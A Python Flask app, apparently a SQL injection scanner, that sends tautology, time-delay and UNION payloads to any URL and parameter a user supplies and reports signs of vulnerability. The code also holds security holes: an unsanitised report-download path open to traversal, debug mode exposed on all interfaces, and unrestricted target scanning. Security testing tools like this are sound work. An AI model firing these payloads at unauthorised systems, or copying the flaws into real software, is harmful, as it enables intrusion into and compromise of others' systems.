#!/usr/bin/env python3
"""
SQL Injection Detector
Author: Olanite Daniel Pelumi
"""

from flask import Flask, render_template, request, jsonify, send_file
import requests
import time
import urllib.parse
from datetime import datetime
import json

app = Flask(__name__)

# SQL Injection payloads
PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "') OR ('1'='1",
    "')) OR (('1'='1",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND pg_sleep(5)--",
]

class SQLiScanner:
    def __init__(self, target_url, parameter, method='GET'):
        self.target_url = target_url
        self.parameter = parameter
        self.method = method.upper()
        self.results = []
        self.vulnerable = False
        
    def test_error_based(self):
        """Test for error-based SQL injection"""
        print(f"[*] Testing error-based SQLi on {self.target_url}")
        
        error_keywords = [
            "sql syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite/JDBCDriver",
            "syntax error",
            "unterminated",
            "quoted string not properly terminated"
        ]
        
        for payload in PAYLOADS[:5]:  # Test basic payloads first
            try:
                if self.method == 'GET':
                    test_url = self.target_url.replace(f"{self.parameter}=", f"{self.parameter}={urllib.parse.quote(payload)}")
                    response = requests.get(test_url, timeout=10)
                else:
                    data = {self.parameter: payload}
                    response = requests.post(self.target_url, data=data, timeout=10)
                
                response_text = response.text.lower()
                
                for error in error_keywords:
                    if error.lower() in response_text:
                        self.vulnerable = True
                        self.results.append({
                            'type': 'Error-based SQLi',
                            'payload': payload,
                            'evidence': f"Database error detected: {error}",
                            'severity': 'High'
                        })
                        return True
                        
            except Exception as e:
                continue
                
        return False
    
    def test_time_based(self):
        """Test for time-based blind SQL injection"""
        print(f"[*] Testing time-based blind SQLi")
        
        time_payloads = [
            ("' AND SLEEP(5)--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("' AND pg_sleep(5)--", 5),
            ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)", 5)
        ]
        
        for payload, sleep_time in time_payloads:
            try:
                start_time = time.time()
                
                if self.method == 'GET':
                    test_url = self.target_url.replace(f"{self.parameter}=", f"{self.parameter}={urllib.parse.quote(payload)}")
                    requests.get(test_url, timeout=sleep_time + 3)
                else:
                    data = {self.parameter: payload}
                    requests.post(self.target_url, data=data, timeout=sleep_time + 3)
                
                elapsed = time.time() - start_time
                
                if elapsed >= sleep_time:
                    self.vulnerable = True
                    self.results.append({
                        'type': 'Time-based Blind SQLi',
                        'payload': payload,
                        'evidence': f"Response delayed by {elapsed:.2f} seconds",
                        'severity': 'High'
                    })
                    return True
                    
            except requests.Timeout:
                # Timeout might indicate vulnerability
                pass
            except Exception as e:
                continue
                
        return False
    
    def test_union_based(self):
        """Test for UNION-based SQL injection"""
        print(f"[*] Testing UNION-based SQLi")
        
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3--",
        ]
        
        for payload in union_payloads:
            try:
                if self.method == 'GET':
                    test_url = self.target_url.replace(f"{self.parameter}=", f"{self.parameter}={urllib.parse.quote(payload)}")
                    response = requests.get(test_url, timeout=10)
                else:
                    data = {self.parameter: payload}
                    response = requests.post(self.target_url, data=data, timeout=10)
                
                # Check for common UNION indicators
                if any(x in response.text for x in ['1', '2', '3', 'NULL']):
                    # Additional validation needed
                    pass
                    
            except Exception as e:
                continue
                
        return False
    
    def scan(self):
        """Run full scan"""
        print(f"[+] Starting SQL injection scan on {self.target_url}")
        print(f"[+] Target parameter: {self.parameter}")
        print(f"[+] HTTP Method: {self.method}")
        print("-" * 50)
        
        # Run all tests
        self.test_error_based()
        self.test_time_based()
        self.test_union_based()
        
        return {
            'target': self.target_url,
            'parameter': self.parameter,
            'method': self.method,
            'scan_time': datetime.now().isoformat(),
            'vulnerable': self.vulnerable,
            'findings': self.results,
            'total_tests': len(PAYLOADS)
        }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.get_json()
    
    if not data or 'url' not in data or 'parameter' not in data:
        return jsonify({'error': 'Missing required fields: url, parameter'}), 400
    
    scanner = SQLiScanner(
        target_url=data['url'],
        parameter=data['parameter'],
        method=data.get('method', 'GET')
    )
    
    results = scanner.scan()
    return jsonify(results)

@app.route('/api/scan/form', methods=['POST'])
def form_scan():
    url = request.form.get('url')
    parameter = request.form.get('parameter')
    method = request.form.get('method', 'GET')
    
    if not url or not parameter:
        return jsonify({'error': 'Missing required fields'}), 400
    
    scanner = SQLiScanner(url, parameter, method)
    results = scanner.scan()
    
    # Generate report file
    report_filename = f"report_{int(time.time())}.json"
    with open(f'reports/{report_filename}', 'w') as f:
        json.dump(results, f, indent=2)
    
    return jsonify(results)

@app.route('/download/report/<filename>')
def download_report(filename):
    return send_file(f'reports/{filename}', as_attachment=True)

if __name__ == '__main__':
    import os
    os.makedirs('reports', exist_ok=True)
    app.run(debug=True, host='0.0.0.0', port=5000)
